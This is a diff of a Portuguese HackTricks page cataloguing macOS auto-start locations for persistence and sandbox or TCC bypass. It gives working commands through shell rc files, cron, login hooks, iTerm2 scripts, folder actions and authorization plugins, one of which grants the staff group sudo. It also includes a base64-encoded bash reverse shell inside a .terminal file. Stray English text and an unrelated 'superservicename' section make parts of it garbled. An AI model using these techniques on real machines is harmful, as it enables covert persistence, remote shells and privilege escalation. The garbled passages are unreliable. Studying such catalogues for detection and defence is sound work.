@@ -1,18 +1,19 @@
 # Auto Inicialização no macOS
 
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Apoie o HackTricks</summary>
 
-Outras maneiras de apoiar o HackTricks:
-
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
 
 Esta seção é fortemente baseada na série de blogs [**Além dos bons e velhos LaunchAgents**](https://theevilbit.github.io/beyond/), o objetivo é adicionar **mais Locais de Auto Inicialização** (se possível), indicar **quais técnicas ainda estão funcionando** atualmente com a última versão do macOS (13.4) e especificar as **permissões** necessárias.
 
@@ -47,19 +48,19 @@ Aqui você pode encontrar locais de inicialização úteis para **burlar a sandb
 * **Gatilho**: Reentrada
 
 {% hint style="success" %}
-Como fato interessante, **`launchd`** possui uma lista de propriedades incorporada na seção Mach-o `__Text.__config` que contém outros serviços bem conhecidos que o launchd deve iniciar. Além disso, esses serviços podem conter o `RequireSuccess`, `RequireRun` e `RebootOnSuccess` que significa que eles devem ser executados e concluídos com sucesso.
+Como fato interessante, **`launchd`** possui uma lista de propriedades incorporada na seção Mach-o `__Text.__config` que contém outros serviços conhecidos que o launchd deve iniciar. Além disso, esses serviços podem conter o `RequireSuccess`, `RequireRun` e `RebootOnSuccess` que significa que eles devem ser executados e concluídos com sucesso.
 
 Obviamente, não pode ser modificado devido à assinatura de código.
 {% endhint %}
 
-#### Descrição & Exploração
+#### Descrição e Exploração
 
-**`launchd`** é o **primeiro** **processo** executado pelo kernel do macOS na inicialização e o último a ser finalizado no desligamento. Ele sempre deve ter o **PID 1**. Esse processo irá **ler e executar** as configurações indicadas nos **plists** **ASEP** em:
+**`launchd`** é o **primeiro** **processo** executado pelo kernel do macOS na inicialização e o último a ser encerrado no desligamento. Ele sempre deve ter o **PID 1**. Esse processo irá **ler e executar** as configurações indicadas nos **plists** do **ASEP** em:
 
 * `/Library/LaunchAgents`: Agentes por usuário instalados pelo administrador
-* `/Library/LaunchDaemons`: Daemons de sistema instalados pelo administrador
+* `/Library/LaunchDaemons`: Daemons em todo o sistema instalados pelo administrador
 * `/System/Library/LaunchAgents`: Agentes por usuário fornecidos pela Apple.
-* `/System/Library/LaunchDaemons`: Daemons de sistema fornecidos pela Apple.
+* `/System/Library/LaunchDaemons`: Daemons em todo o sistema fornecidos pela Apple.
 
 Quando um usuário faz login, os plists localizados em `/Users/$USER/Library/LaunchAgents` e `/Users/$USER/Library/LaunchDemons` são iniciados com as **permissões dos usuários logados**.
 
@@ -127,12 +128,12 @@ Uma das primeiras coisas que o `launchd` faria é **iniciar** todos os **daemons
 
 ### Arquivos de inicialização do shell
 
-Artigo: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
-Artigo (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)
+Descrição: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
+Descrição (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)
 
 * Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
-* Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
-* Mas você precisa encontrar um aplicativo com um bypass do TCC que execute um shell que carregue esses arquivos
+* Contorno do TCC: [✅](https://emojipedia.org/check-mark-button)
+* Mas você precisa encontrar um aplicativo com um contorno do TCC que execute um shell que carregue esses arquivos
 
 #### Localizações
 
@@ -154,7 +155,7 @@ Artigo (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://thee
 * `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
   * **Gatilho**: Esperado para ser acionado com xterm, mas **não está instalado** e mesmo após instalado esse erro é exibido: xterm: `DISPLAY is not set`
 
-#### Descrição e Exploração
+#### Descrição & Exploração
 
 Ao iniciar um ambiente de shell como `zsh` ou `bash`, **certos arquivos de inicialização são executados**. Atualmente, o macOS usa `/bin/zsh` como o shell padrão. Esse shell é acessado automaticamente quando o aplicativo Terminal é iniciado ou quando um dispositivo é acessado via SSH. Embora `bash` e `sh` também estejam presentes no macOS, eles precisam ser explicitamente invocados para serem usados.
 
@@ -166,7 +167,7 @@ echo "touch /tmp/hacktricks" >> ~/.zshrc
 ### Aplicações Reabertas
 
 {% hint style="danger" %}
-Configurar a exploração indicada e sair e entrar novamente ou até mesmo reiniciar não funcionou para mim para executar o aplicativo. (O aplicativo não estava sendo executado, talvez precise estar em execução quando essas ações são realizadas)
+Configurar a exploração indicada e fazer logout e login ou até mesmo reiniciar não funcionou para mim para executar o aplicativo. (O aplicativo não estava sendo executado, talvez precise estar em execução quando essas ações são realizadas)
 {% endhint %}
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)
@@ -183,7 +184,7 @@ Configurar a exploração indicada e sair e entrar novamente ou até mesmo reini
 
 Todas as aplicações a serem reabertas estão dentro do plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
 
-Portanto, para fazer com que as aplicações reabertas iniciem a sua própria, você só precisa **adicionar seu aplicativo à lista**.
+Portanto, para fazer com que as aplicações reabram seu próprio aplicativo, você só precisa **adicionar seu aplicativo à lista**.
 
 O UUID pode ser encontrado listando esse diretório ou com `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`
 
@@ -207,7 +208,7 @@ Para **adicionar um aplicativo a esta lista**, você pode usar:
 
 * Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
-* Terminal usado para ter permissões do FDA se o usuário o usar
+* O Terminal usa permissões do FDA se o usuário o utilizar
 
 #### Localização
 
@@ -257,16 +258,16 @@ Você pode adicionar isso a partir da linha de comando com:
 
 * Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Contorno do TCC: [✅](https://emojipedia.org/check-mark-button)
-* O Terminal usa permissões do FDA do usuário que o utiliza
+* Terminal usado para ter permissões do FDA se o usuário o usar
 
 #### Localização
 
 * **Qualquer lugar**
-* **Gatilho**: Abrir o Terminal
+* **Gatilho**: Abrir Terminal
 
 #### Descrição e Exploração
 
-Se você criar um script [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) e abri-lo, o aplicativo **Terminal** será automaticamente invocado para executar os comandos indicados nele. Se o aplicativo Terminal tiver alguns privilégios especiais (como o TCC), seu comando será executado com esses privilégios especiais.
+Se você criar um script [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) e abri-lo, o aplicativo **Terminal** será automaticamente invocado para executar os comandos indicados nele. Se o aplicativo Terminal tiver alguns privilégios especiais (como TCC), seu comando será executado com esses privilégios especiais.
 
 Experimente com:
 ```bash
@@ -296,20 +297,14 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
-Você também pode usar as extensões **`.command`**, **`.tool`**, com conteúdo de scripts shell regular e eles também serão abertos pelo Terminal.
-
-{% hint style="danger" %}
-Se o terminal tiver **Acesso Total ao Disco**, ele será capaz de concluir essa ação (observe que o comando executado será visível em uma janela do terminal).
-{% endhint %}
-
-### Plugins de Áudio
+### Extensões de Áudio
 
 Descrição: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
 Descrição: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
 
 * Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
-* Você pode obter algum acesso extra ao TCC
+* Você pode obter acesso extra ao TCC
 
 #### Localização
 
@@ -329,13 +324,13 @@ Descrição: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](http
 
 De acordo com as descrições anteriores, é possível **compilar alguns plugins de áudio** e carregá-los.
 
-### Plugins QuickLook
+### Extensões QuickLook
 
 Descrição: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)
 
 * Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
-* Você pode obter algum acesso extra ao TCC
+* Você pode obter acesso extra ao TCC
 
 #### Localização
 
@@ -345,13 +340,13 @@ Descrição: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevil
 * `/Applications/NomeDoAplicativo/Aplicativo/Conteúdo/Biblioteca/QuickLook/`
 * `~/Applications/NomeDoAplicativo/Aplicativo/Conteúdo/Biblioteca/QuickLook/`
 
-#### Descrição e Exploração
+#### Descrição & Exploração
 
-Os plugins QuickLook podem ser executados quando você **aciona a visualização de um arquivo** (pressione a barra de espaço com o arquivo selecionado no Finder) e um **plugin que suporta esse tipo de arquivo** está instalado.
+As extensões QuickLook podem ser executadas quando você **aciona a visualização de um arquivo** (pressione a barra de espaço com o arquivo selecionado no Finder) e um **plugin que suporta esse tipo de arquivo** está instalado.
 
-É possível compilar seu próprio plugin QuickLook, colocá-lo em uma das localizações anteriores para carregá-lo e depois ir para um arquivo suportado e pressionar espaço para ativá-lo.
+É possível compilar sua própria extensão QuickLook, colocá-la em uma das localizações anteriores para carregá-la e depois ir para um arquivo suportado e pressionar espaço para ativá-la.
 
-### ~~Hooks de Login/Logout~~
+### ~~Ganchos de Login/Logout~~
 
 {% hint style="danger" %}
 Isso não funcionou para mim, nem com o LoginHook do usuário nem com o LogoutHook do root
@@ -377,7 +372,7 @@ chmod +x $HOME/hook.sh
 defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
 defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
 ```
-Este ajuste é armazenado em `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
+Esta configuração é armazenada em `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
 ```bash
 defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
 {
@@ -423,7 +418,7 @@ Liste os trabalhos cron do **usuário atual** com:
 ```bash
 crontab -l
 ```
-Você também pode ver todos os trabalhos cron dos usuários em **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (necessita de privilégios de root).
+Você também pode ver todos os trabalhos cron dos usuários em **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (necessita de permissão de root).
 
 No MacOS, várias pastas que executam scripts com **certa frequência** podem ser encontradas em:
 ```bash
@@ -432,7 +427,7 @@ ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
 ```
 Aqui você pode encontrar os **trabalhos cron** regulares, os **trabalhos at** (não muito usados) e os **trabalhos periódicos** (principalmente usados para limpar arquivos temporários). Os trabalhos periódicos diários podem ser executados, por exemplo, com: `periodic daily`.
 
-Para adicionar um **trabalho cron de usuário programaticamente** é possível usar:
+Para adicionar um **trabalho cron de usuário programaticamente**, é possível usar:
 ```bash
 echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
 crontab /tmp/cron
@@ -442,7 +437,7 @@ crontab /tmp/cron
 Descrição: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)
 
 * Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
-* Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
+* Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
 * iTerm2 costumava ter permissões TCC concedidas
 
 #### Localizações
@@ -473,11 +468,7 @@ Launch Agents are used to run processes when a user logs in. They are located in
 
 #### Launch Daemons
 
-Launch Daemons are used to run processes at system startup. They are located in `/Library/LaunchDaemons/`.
-
-#### Login Items
-
-Login Items are applications that open when a user logs in. They can be managed in `System Preferences > Users & Groups > Login Items`.
+Launch Daemons are used to run processes at system boot or login. They are located in `/Library/LaunchDaemons/` and `/System/Library/LaunchDaemons/`.
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
 #!/usr/bin/env python3
@@ -573,7 +564,7 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 
 #### Descrição
 
-[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) atua como uma plataforma de automação para o **macOS**, utilizando a linguagem de script **LUA** para suas operações. Notavelmente, ele suporta a integração de código completo em AppleScript e a execução de scripts shell, aprimorando significativamente suas capacidades de script.
+[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) atua como uma plataforma de automação para o **macOS**, aproveitando a linguagem de script **LUA** para suas operações. Notavelmente, ele suporta a integração de código completo em AppleScript e a execução de scripts de shell, aprimorando significativamente suas capacidades de script.
 
 O aplicativo procura por um único arquivo, `~/.hammerspoon/init.lua`, e quando iniciado, o script será executado.
 ```bash
@@ -833,9 +824,9 @@ app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
 {% endcode %}
 
-Compile com: `osacompile -l JavaScript -o folder.scpt source.js`
+Compilar com: `osacompile -l JavaScript -o folder.scpt source.js`
 
-Mova para:
+Mover para:
 ```bash
 mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
 mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
@@ -971,6 +962,8 @@ Descrição: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilb
 Então, quando o selecionador de cores for acionado, seu código também deve ser.
 
 Observe que o binário carregando sua biblioteca tem uma **sandbox muito restritiva**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+
+{% code overflow="wrap" %}
 ```bash
 [Key] com.apple.security.temporary-exception.sbpl
 [Value]
@@ -1139,9 +1132,9 @@ writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.
 O Spotlight é o recurso de pesquisa integrado do macOS, projetado para fornecer aos usuários **acesso rápido e abrangente aos dados em seus computadores**.\
 Para facilitar essa capacidade de pesquisa rápida, o Spotlight mantém um **banco de dados proprietário** e cria um índice **analisando a maioria dos arquivos**, permitindo buscas rápidas tanto por nomes de arquivos quanto por seu conteúdo.
 
-O mecanismo subjacente do Spotlight envolve um processo central chamado 'mds', que significa **'servidor de metadados'**. Esse processo orquestra todo o serviço do Spotlight. Complementando isso, existem vários daemons 'mdworker' que realizam uma variedade de tarefas de manutenção, como indexar diferentes tipos de arquivos (`ps -ef | grep mdworker`). Essas tarefas são possíveis por meio de plugins importadores do Spotlight, ou **"bundles .mdimporter"**, que permitem ao Spotlight entender e indexar conteúdo em uma ampla gama de formatos de arquivo.
+O mecanismo subjacente do Spotlight envolve um processo central chamado 'mds', que significa **'servidor de metadados'**. Esse processo orquestra todo o serviço do Spotlight. Complementando isso, existem vários daemons 'mdworker' que realizam uma variedade de tarefas de manutenção, como indexar diferentes tipos de arquivos (`ps -ef | grep mdworker`). Essas tarefas são possíveis por meio de plugins do importador do Spotlight, ou **"pacotes .mdimporter"**, que permitem ao Spotlight entender e indexar conteúdo em uma ampla gama de formatos de arquivo.
 
-Os plugins ou **bundles `.mdimporter`** estão localizados nos locais mencionados anteriormente e se um novo bundle aparecer, ele é carregado em minutos (sem a necessidade de reiniciar nenhum serviço). Esses bundles precisam indicar quais **tipos de arquivo e extensões eles podem gerenciar**, dessa forma, o Spotlight os usará quando um novo arquivo com a extensão indicada for criado.
+Os plugins ou **pacotes `.mdimporter`** estão localizados nos locais mencionados anteriormente e se um novo pacote aparecer, ele é carregado em minutos (não é necessário reiniciar nenhum serviço). Esses pacotes precisam indicar quais **tipos de arquivo e extensões eles podem gerenciar**, dessa forma, o Spotlight os usará quando um novo arquivo com a extensão indicada for criado.
 
 É possível **encontrar todos os `mdimporters`** carregados executando:
 ```bash
@@ -1152,7 +1145,7 @@ Paths: id(501) (
 "/System/Library/Spotlight/PDF.mdimporter",
 [...]
 ```
-E por exemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** é usado para analisar esses tipos de arquivos (extensões `.iba` e `.book`, entre outros):
+E por exemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** é usado para analisar esse tipo de arquivos (extensões `.iba` e `.book`, entre outros):
 ```json
 plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 
@@ -1197,7 +1190,7 @@ Além disso, os plugins padrão do sistema sempre têm precedência, então um a
 Para criar seu próprio importador, você pode começar com este projeto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) e então alterar o nome, o **`CFBundleDocumentTypes`** e adicionar **`UTImportedTypeDeclarations`** para que ele suporte a extensão que você deseja e refleti-las em **`schema.xml`**.\
 Em seguida, **altere** o código da função **`GetMetadataForFile`** para executar sua carga útil quando um arquivo com a extensão processada for criado.
 
-Por fim, **construa e copie seu novo `.mdimporter`** para um dos locais anteriores e você pode verificar sempre que ele for carregado **monitorando os logs** ou verificando **`mdimport -L.`**
+Finalmente, **construa e copie seu novo `.mdimporter`** para um dos locais anteriores e você pode verificar sempre que ele for carregado **monitorando os logs** ou verificando **`mdimport -L.`**
 
 ### ~~Painel de Preferências~~
 
@@ -1205,7 +1198,7 @@ Por fim, **construa e copie seu novo `.mdimporter`** para um dos locais anterior
 Parece que isso não está mais funcionando.
 {% endhint %}
 
-Descrição: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)
+Artigo: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)
 
 * Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 * Requer uma ação específica do usuário
@@ -1217,17 +1210,19 @@ Descrição: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevil
 * **`/Library/PreferencePanes`**
 * **`~/Library/PreferencePanes`**
 
-Descrição: Parece que isso não está mais funcionando.
+#### Descrição
 
-## Bypass de Sandbox Root
+Parece que isso não está mais funcionando.
+
+## Bypass de Sandbox de Root
 
 {% hint style="success" %}
-Aqui você pode encontrar locais de início úteis para **burlar a sandbox** que permitem simplesmente executar algo **escrevendo em um arquivo** sendo **root** e/ou exigindo outras **condições estranhas.**
+Aqui você pode encontrar locais de inicialização úteis para **burlar a sandbox** que permitem simplesmente executar algo **escrevendo em um arquivo** sendo **root** e/ou exigindo outras **condições estranhas.**
 {% endhint %}
 
 ### Periódico
 
-Descrição: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)
+Artigo: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)
 
 * Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 * Mas você precisa ser root
@@ -1242,7 +1237,7 @@ Descrição: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevil
 * Root necessário
 * **Gatilho**: Quando chegar a hora
 
-Descrição & Exploração
+#### Descrição e Exploração
 
 Os scripts periódicos (**`/etc/periodic`**) são executados por causa dos **launch daemons** configurados em `/System/Library/LaunchDaemons/com.apple.periodic*`. Note que os scripts armazenados em `/etc/periodic/` são **executados** como o **proprietário do arquivo**, então isso não funcionará para uma possível escalada de privilégios.
 
@@ -1299,7 +1294,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.
 
 * Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 * Mas você precisa ser root
-* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
+* Bypass do TCC: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Localização
 
@@ -1331,16 +1326,16 @@ session    required       pam_permit.so
 E, portanto, qualquer tentativa de usar **`sudo` funcionará**.
 
 {% hint style="danger" %}
-Note que este diretório é protegido pelo TCC, então é altamente provável que o usuário receba um prompt solicitando acesso.
+Note que este diretório é protegido pelo TCC, então é altamente provável que o usuário receba um aviso solicitando acesso.
 {% endhint %}
 
 ### Plugins de Autorização
 
-Descrição: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
-Descrição: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
+Análise: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
+Análise: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
 
 * Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-* Mas você precisa ser root e fazer configurações extras
+* Mas é necessário ser root e fazer configurações extras
 * Bypass do TCC: ???
 
 #### Localização
@@ -1351,7 +1346,7 @@ Descrição: [https://posts.specterops.io/persistent-credential-theft-with-autho
 
 #### Descrição e Exploração
 
-Você pode criar um plugin de autorização que será executado quando um usuário fizer login para manter a persistência. Para obter mais informações sobre como criar um desses plugins, consulte as descrições anteriores (e tenha cuidado, um mal escrito pode te bloquear e você precisará limpar seu Mac no modo de recuperação).
+Você pode criar um plugin de autorização que será executado quando um usuário fizer login para manter a persistência. Para mais informações sobre como criar um desses plugins, consulte as análises anteriores (e tenha cuidado, um mal escrito pode te bloquear e você precisará limpar seu Mac no modo de recuperação).
 ```objectivec
 // Compile the code and create a real bundle
 // gcc -bundle -framework Foundation main.m -o CustomAuth
@@ -1391,11 +1386,11 @@ security authorizationdb write com.asdf.asdf < /tmp/rule.plist
 ```
 O **`evaluate-mechanisms`** informará ao framework de autorização que será necessário **chamar um mecanismo externo para autorização**. Além disso, **`privileged`** fará com que seja executado pelo root.
 
-Acione-o com:
+Dispare com:
 ```bash
 security authorize com.asdf.asdf
 ```
-E então o grupo **staff deve ter acesso sudo** (leia `/etc/sudoers` para confirmar).
+E então o grupo **staff** deve ter acesso **sudo** (leia `/etc/sudoers` para confirmar).
 
 ### Man.conf
 
@@ -1434,7 +1429,7 @@ touch /tmp/manconf
 * Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 * Mas você precisa estar como root e o apache precisa estar em execução
 * Bypass do TCC: [🔴](https://emojipedia.org/large-red-circle)
-* Httpd não possui privilégios
+* Httpd não possui direitos
 
 #### Localização
 
@@ -1523,26 +1518,16 @@ Certifique-se de que tanto o script rc quanto o arquivo `StartupParameters.plist
 
 {% tab title="superservicename" %} 
 
-### Nome do Super Serviço
+### Localizações de Inicialização Automática do macOS
 
-Este é um local de inicialização automática específico para o serviço "superservicename". Aqui você pode adicionar ou remover itens de inicialização automática para este serviço.
+O macOS oferece várias maneiras de iniciar automaticamente aplicativos, scripts e serviços quando um usuário faz login. Essas são algumas das localizações comuns onde itens de inicialização automática podem ser encontrados:
 
-#### Localização:
+- **LaunchAgents:** Localizados em `~/Library/LaunchAgents`, esses itens são iniciados quando um usuário faz login.
+- **LaunchDaemons:** Localizados em `/Library/LaunchDaemons`, esses itens são iniciados durante a inicialização do sistema.
+- **Login Items:** Configurados nas preferências de usuários, esses itens são iniciados quando um usuário faz login.
+- **Startup Items:** Localizados em `/Library/StartupItems`, esses itens são iniciam durante a inicialização do sistema, mas são obsoletos e não são mais suportados a partir do macOS 10.5.
 
-```plaintext
-/Library/LaunchDaemons/com.superservicename.plist
-```
-
-#### Descrição:
-
-Este arquivo .plist controla a inicialização automática do serviço "superservicename" no sistema macOS. Certifique-se de revisar e monitorar este arquivo para garantir que apenas itens autorizados sejam executados durante a inicialização do sistema.
-
-#### Instruções:
-
-1. Para adicionar um item de inicialização automática, edite o arquivo .plist e adicione a entrada apropriada.
-2. Para remover um item de inicialização automática, remova a entrada correspondente do arquivo .plist.
-
-Certifique-se de ter as permissões adequadas para modificar este arquivo. Recomenda-se fazer um backup do arquivo original antes de fazer qualquer alteração. 
+Revisar e monitorar essas localizações pode ajudar a identificar e gerenciar o que é iniciado automaticamente no macOS. Isso pode ser útil para garantir a segurança e o desempenho do sistema. 
 
 {% endtab %}
 ```bash
@@ -1587,7 +1572,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.
 #### Localização
 
 * **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
-* Requer privilégios de root
+* Necessário acesso de root
 * **Gatilho**: Com XQuartz
 
 #### Descrição e Exploração
@@ -1609,7 +1594,7 @@ Para instalar um KEXT como um item de inicialização, ele precisa ser **instala
 * `/Library/Extensions`
 * Arquivos KEXT instalados por software de terceiros
 
-Você pode listar os arquivos KEXT atualmente carregados com:
+Você pode listar os arquivos kext atualmente carregados com:
 ```bash
 kextstat #List loaded kext
 kextload /path/to/kext.kext #Load a new one based on path
@@ -1752,16 +1737,17 @@ esac
 * [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
 * [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)
 
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Suporte ao HackTricks</summary>
 
-Outras formas de apoiar o HackTricks:
-
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
